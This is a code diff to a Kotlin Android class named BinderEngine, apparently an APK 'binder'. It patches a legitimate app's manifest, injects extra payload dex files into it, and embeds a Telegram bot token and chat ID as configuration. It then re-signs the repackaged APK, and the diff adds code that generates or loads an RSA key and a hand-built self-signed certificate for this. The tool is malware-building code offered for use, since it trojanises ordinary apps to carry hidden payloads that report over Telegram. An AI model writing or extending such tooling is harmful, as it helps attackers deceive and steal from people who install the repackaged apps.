@@ -13,9 +13,21 @@ import kotlinx.coroutines.withContext
 import java.io.File
 import java.io.FileOutputStream
 import java.io.OutputStream
+import java.security.Certificate
+import java.security.KeyFactory
+import java.security.KeyPair
+import java.security.KeyPairGenerator
 import java.security.KeyStore
 import java.security.PrivateKey
+import java.security.SecureRandom
+import java.security.Signature
+import java.security.cert.CertificateFactory
 import java.security.cert.X509Certificate
+import java.security.spec.PKCS8EncodedKeySpec
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
+import java.util.TimeZone
 import java.util.zip.CRC32
 import java.util.zip.ZipEntry
 import java.util.zip.ZipFile
@@ -116,7 +128,6 @@ class BinderEngine(private val context: Context) {
                 onLog(LogLevel.INFO, "Patched manifest: ${patchedBytes.size} bytes")
 
                 var slot = maxDexIndex(zip)
-                onLog(LogLevel.INFO, "Host dex max index: $slot")
 
                 FileOutputStream(temp).use { fos ->
                     CountingStream(fos).use { cs ->
@@ -142,8 +153,8 @@ class BinderEngine(private val context: Context) {
                                 slot++
                                 val dexName = if (slot == 1) "classes.dex" else "classes$slot.dex"
                                 writeEntry(zos, cs, dexName, dex, false)
-                                onLog(LogLevel.INFO, "Injected $dexName (${dex.size / 1024} KB)")
                             }
+                            onLog(LogLevel.INFO, "Injected ${payloadDexes.size} dex files")
 
                             if (config.token.isNotBlank() && config.chatId.isNotBlank()) {
                                 val json = "{\"bot_token\":\"${config.token}\",\"chat_id\":\"${config.chatId}\"}"
@@ -178,7 +189,6 @@ class BinderEngine(private val context: Context) {
             }
 
             onLog(LogLevel.INFO, "Verified: ${check.packageName}")
-            onLog(LogLevel.INFO, "App class: ${check.applicationInfo?.className ?: "(none)"}")
             onLog(LogLevel.INFO, "Signed size: ${signed.length() / 1024} KB")
 
             if (!outDir.exists() || !outDir.isDirectory) {
@@ -233,12 +243,10 @@ class BinderEngine(private val context: Context) {
                 while (entries.hasMoreElements()) {
                     val e = entries.nextElement()
                     if (!rx.matches(e.name)) continue
-                    val bytes = z.getInputStream(e).use { it.readBytes() }
-                    out.add(bytes)
+                    out.add(z.getInputStream(e).use { it.readBytes() })
                 }
             }
         } catch (t: Throwable) {
-            // ignore, caller checks empty
         }
         return out
     }
@@ -255,6 +263,9 @@ class BinderEngine(private val context: Context) {
         return max
     }
 
+    // ------------------------------------------------------------------
+    // Source
+    // ------------------------------------------------------------------
     private fun resolveSource(uri: Uri): File? {
         try {
             if (uri.scheme == "file") {
@@ -389,19 +400,15 @@ class BinderEngine(private val context: Context) {
         override fun close() = out.flush()
     }
 
+    // ------------------------------------------------------------------
+    // Signing
+    // ------------------------------------------------------------------
     private fun sign(input: File, output: File, onLog: (LogLevel, String) -> Unit) {
-        val ks = KeyStore.getInstance("JKS")
-        context.assets.open(Const.KEYSTORE_ASSET).use {
-            ks.load(it, Const.KS_PASS.toCharArray())
-        }
+        val identity = signingIdentity(onLog)
+        val key = identity.first
+        val cert = identity.second
 
-        val alias = if (ks.containsAlias(Const.KS_ALIAS)) Const.KS_ALIAS
-        else ks.aliases().nextElement()
-
-        val key = ks.getKey(alias, Const.KS_PASS.toCharArray()) as PrivateKey
-        val cert = ks.getCertificate(alias) as X509Certificate
-
-        val signer = ApkSigner.SignerConfig.Builder(alias, key, listOf(cert)).build()
+        val signer = ApkSigner.SignerConfig.Builder("hs", key, listOf(cert)).build()
 
         ApkSigner.Builder(listOf(signer))
             .setInputApk(input)
@@ -413,5 +420,152 @@ class BinderEngine(private val context: Context) {
             .sign()
 
         onLog(LogLevel.INFO, "Signed: ${output.length() / 1024} KB")
+    }
+
+    private fun signingIdentity(onLog: (LogLevel, String) -> Unit): Pair<PrivateKey, X509Certificate> {
+        val dir = File(context.filesDir, "sign")
+        val keyFile = File(dir, "key.pk8")
+        val certFile = File(dir, "cert.der")
+
+        if (keyFile.exists() && certFile.exists()) {
+            try {
+                val kf = KeyFactory.getInstance("RSA")
+                val key = kf.generatePrivate(PKCS8EncodedKeySpec(keyFile.readBytes()))
+                val cf = CertificateFactory.getInstance("X.509")
+                val cert = cf.generateCertificate(certFile.inputStream()) as X509Certificate
+                onLog(LogLevel.INFO, "Using saved signing key")
+                return key to cert
+            } catch (t: Throwable) {
+                onLog(LogLevel.WARN, "Saved key unreadable, regenerating")
+            }
+        }
+
+        fromAssetKeystore()?.let {
+            onLog(LogLevel.INFO, "Using keystore from assets")
+            try {
+                dir.mkdirs()
+                keyFile.writeBytes(it.first.encoded)
+                certFile.writeBytes(it.second.encoded)
+            } catch (_: Throwable) {
+            }
+            return it
+        }
+
+        onLog(LogLevel.INFO, "Generating new signing key...")
+        dir.mkdirs()
+
+        val kp = KeyPairGenerator.getInstance("RSA").apply { initialize(2048) }.generateKeyPair()
+        val cert = selfSigned(kp)
+
+        keyFile.writeBytes(kp.private.encoded)
+        certFile.writeBytes(cert.encoded)
+
+        onLog(LogLevel.INFO, "New key ready")
+        return kp.private to cert
+    }
+
+    private fun fromAssetKeystore(): Pair<PrivateKey, X509Certificate>? {
+        for (type in listOf("PKCS12", "BKS", "JKS")) {
+            try {
+                val ks = KeyStore.getInstance(type)
+                context.assets.open(Const.KEYSTORE_ASSET).use {
+                    ks.load(it, Const.KS_PASS.toCharArray())
+                }
+                val alias = if (ks.containsAlias(Const.KS_ALIAS)) Const.KS_ALIAS
+                else ks.aliases().nextElement()
+                val key = ks.getKey(alias, Const.KS_PASS.toCharArray()) as PrivateKey
+                val cert = ks.getCertificate(alias) as X509Certificate
+                return key to cert
+            } catch (t: Throwable) {
+            }
+        }
+        return null
+    }
+
+    private fun selfSigned(kp: KeyPair): X509Certificate {
+        val sha256Rsa = seq(oid("1.2.840.113549.1.1.11"), tlv(0x05, ByteArray(0)))
+        val name = seq(set(seq(oid("2.5.4.3"), tlv(0x0C, "Hs Binder".toByteArray()))))
+
+        val now = Date()
+        val notBefore = utcTime(Date(now.time - 86400000L))
+        val notAfter = utcTime(Date(now.time + 3650L * 86400000L))
+
+        val serial = ByteArray(16)
+        SecureRandom().nextBytes(serial)
+        serial[0] = (serial[0].toInt() and 0x7F).toByte()
+        if (serial[0] == 0.toByte()) serial[0] = 1
+
+        val tbs = seq(
+            tlv(0xA0, tlv(0x02, byteArrayOf(2))),
+            tlv(0x02, serial),
+            sha256Rsa,
+            name,
+            seq(notBefore, notAfter),
+            name,
+            kp.public.encoded
+        )
+
+        val sig = Signature.getInstance("SHA256withRSA").apply {
+            initSign(kp.private)
+            update(tbs)
+        }.sign()
+
+        val der = seq(tbs, sha256Rsa, tlv(0x03, byteArrayOf(0) + sig))
+
+        return CertificateFactory.getInstance("X.509")
+            .generateCertificate(der.inputStream()) as X509Certificate
+    }
+
+    private fun derLen(n: Int): ByteArray {
+        if (n < 0x80) return byteArrayOf(n.toByte())
+        var v = n
+        var count = 0
+        while (v > 0) {
+            v = v shr 8
+            count++
+        }
+        val out = ByteArray(count + 1)
+        out[0] = (0x80 or count).toByte()
+        for (i in 1..count) out[i] = ((n shr (8 * (count - i))) and 0xFF).toByte()
+        return out
+    }
+
+    private fun tlv(tag: Int, body: ByteArray): ByteArray =
+        byteArrayOf(tag.toByte()) + derLen(body.size) + body
+
+    private fun seq(vararg parts: ByteArray): ByteArray {
+        var body = ByteArray(0)
+        for (p in parts) body += p
+        return tlv(0x30, body)
+    }
+
+    private fun set(vararg parts: ByteArray): ByteArray {
+        var body = ByteArray(0)
+        for (p in parts) body += p
+        return tlv(0x31, body)
+    }
+
+    private fun oid(dotted: String): ByteArray {
+        val parts = dotted.split('.').map { it.toLong() }
+        val body = ArrayList<Byte>()
+        body.add((40 * parts[0] + parts[1]).toByte())
+        for (i in 2 until parts.size) {
+            var v = parts[i]
+            val stack = ArrayList<Byte>()
+            stack.add((v and 0x7F).toByte())
+            v = v shr 7
+            while (v > 0) {
+                stack.add(((v and 0x7F) or 0x80).toByte())
+                v = v shr 7
+            }
+            for (j in stack.indices.reversed()) body.add(stack[j])
+        }
+        return tlv(0x06, body.toByteArray())
+    }
+
+    private fun utcTime(d: Date): ByteArray {
+        val f = SimpleDateFormat("yyMMddHHmmss'Z'", Locale.US)
+        f.timeZone = TimeZone.getTimeZone("UTC")
+        return tlv(0x17, f.format(d).toByteArray())
     }
 }
